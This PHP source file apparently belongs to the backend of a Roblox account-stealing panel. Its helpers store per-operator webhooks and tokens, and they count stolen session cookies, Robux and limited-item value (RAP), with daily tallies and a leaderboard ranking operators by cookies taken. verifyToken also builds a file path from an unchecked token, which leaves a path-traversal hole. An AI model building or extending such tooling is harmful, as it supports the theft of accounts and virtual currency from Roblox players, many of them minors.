/**
 * Get instance data from file-based storage
 */
function getInstanceData($directory) {
    $path = __DIR__ . "/instances/$directory";
    
    if (!file_exists($path)) {
        return null;
    }
    
    // Read all instance files
    $webhook = @file_get_contents("$path/webhook.txt") ?: '';
    $userWebhook = @file_get_contents("$path/userwebhook.txt") ?: $webhook;
    $token = @file_get_contents("$path/token.txt") ?: '';
    $visits = (int)(@file_get_contents("$path/visits.txt") ?: 0);
    $cookies = (int)(@file_get_contents("$path/cookies.txt") ?: 0);
    $robux = (int)(@file_get_contents("$path/robux.txt") ?: 0);
    $rap = (int)(@file_get_contents("$path/rap.txt") ?: 0);
    $summary = (int)(@file_get_contents("$path/summary.txt") ?: 0);
    $username = @file_get_contents("$path/username.txt") ?: '';
    $profilePic = @file_get_contents("$path/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png';
    $created = @file_get_contents("$path/created.txt") ?: '';
    
    // Read daily stats
    $dailyCookies = json_decode(@file_get_contents("$path/daily_cookies.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailyRobux = json_decode(@file_get_contents("$path/daily_robux.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailyRap = json_decode(@file_get_contents("$path/daily_rap.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailySummary = json_decode(@file_get_contents("$path/daily_summary.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailyVisits = json_decode(@file_get_contents("$path/daily_visits.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    
    return [
        'directory' => $directory,
        'webhook' => trim($webhook),
        'userWebhook' => trim($userWebhook),
        'token' => trim($token),
        'username' => trim($username),
        'profilePicture' => trim($profilePic),
        'created' => $created,
        'stats' => [
            'totalVisits' => $visits,
            'totalCookies' => $cookies,
            'totalRobux' => $robux,
            'totalRAP' => $rap,
            'totalSummary' => $summary
        ],
        'dailyStats' => [
            'cookies' => $dailyCookies,
            'robux' => $dailyRobux,
            'rap' => $dailyRap,
            'summary' => $dailySummary,
            'visits' => $dailyVisits
        ]
    ];
}

/**
 * Update instance stats (file-based)
 */
function updateInstanceStats($directory, $statName, $value) {
    $path = __DIR__ . "/instances/$directory";
    
    if (!file_exists($path)) {
        return false;
    }
    
    $filename = '';
    switch ($statName) {
        case 'totalVisits':
            $filename = 'visits.txt';
            break;
        case 'totalCookies':
            $filename = 'cookies.txt';
            break;
        case 'totalRobux':
            $filename = 'robux.txt';
            break;
        case 'totalRAP':
            $filename = 'rap.txt';
            break;
        case 'totalSummary':
            $filename = 'summary.txt';
            break;
        default:
            return false;
    }
    
    file_put_contents("$path/$filename", (string)$value, LOCK_EX);
    return true;
}

/**
 * Update daily stats (file-based)
 */
function updateDailyStats($directory, $statName, $increment) {
    $path = __DIR__ . "/instances/$directory";
    
    if (!file_exists($path)) {
        return false;
    }
    
    $filename = "daily_{$statName}.txt";
    $stats = json_decode(@file_get_contents("$path/$filename") ?: '[]', true);
    
    if (!is_array($stats) || count($stats) !== 7) {
        $stats = array_fill(0, 7, 0);
    }
    
    $today = (int)date('w'); // 0 (Sunday) to 6 (Saturday)
    $stats[$today] += $increment;
    
    file_put_contents("$path/$filename", json_encode($stats), LOCK_EX);
    return true;
}

/**
 * Get global stats from all instances
 */
function getGlobalStats() {
    $instancesPath = __DIR__ . '/instances';
    
    if (!file_exists($instancesPath)) {
        return [
            'totalInstances' => 0,
            'totalCookies' => 0,
            'totalVisits' => 0,
            'totalRobux' => 0
        ];
    }
    
    $totalInstances = 0;
    $totalCookies = 0;
    $totalVisits = 0;
    $totalRobux = 0;
    
    $dirs = array_diff(scandir($instancesPath), ['.', '..']);
    
    foreach ($dirs as $dir) {
        if (is_dir("$instancesPath/$dir")) {
            $totalInstances++;
            $totalCookies += (int)(@file_get_contents("$instancesPath/$dir/cookies.txt") ?: 0);
            $totalVisits += (int)(@file_get_contents("$instancesPath/$dir/visits.txt") ?: 0);
            $totalRobux += (int)(@file_get_contents("$instancesPath/$dir/robux.txt") ?: 0);
        }
    }
    
    return [
        'totalInstances' => $totalInstances,
        'totalCookies' => $totalCookies,
        'totalVisits' => $totalVisits,
        'totalRobux' => $totalRobux
    ];
}

/**
 * Get leaderboard (top instances by cookies)
 */
function getLeaderboard($limit = 5) {
    $instancesPath = __DIR__ . '/instances';
    
    if (!file_exists($instancesPath)) {
        return [];
    }
    
    $instances = [];
    $dirs = array_diff(scandir($instancesPath), ['.', '..']);
    
    foreach ($dirs as $dir) {
        if (is_dir("$instancesPath/$dir")) {
            $cookies = (int)(@file_get_contents("$instancesPath/$dir/cookies.txt") ?: 0);
            $visits = (int)(@file_get_contents("$instancesPath/$dir/visits.txt") ?: 0);
            $username = @file_get_contents("$instancesPath/$dir/username.txt") ?: $dir;
            $profilePic = @file_get_contents("$instancesPath/$dir/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png';
            
            $instances[] = [
                'directory' => $dir,
                'totalCookies' => $cookies,
                'totalVisits' => $visits,
                'username' => $username,
                'profilePicture' => $profilePic
            ];
        }
    }
    
    // Sort by cookies (descending)
    usort($instances, function($a, $b) {
        return $b['totalCookies'] - $a['totalCookies'];
    });
    
    return array_slice($instances, 0, $limit);
}

/**
 * Verify token and get instance directory
 */
function verifyToken($token) {
    $tokensPath = __DIR__ . '/tokens';
    $tokenFile = "$tokensPath/$token.txt";
    
    if (!file_exists($tokenFile)) {
        return null;
    }
    
    $data = file_get_contents($tokenFile);
    $parts = explode('|', $data);
    
    if (count($parts) < 3) {
        return null;
    }
    
    return [
        'token' => trim($parts[0]),
        'directory' => trim($parts[1]),
        'webhook' => trim($parts[2])
    ];
}
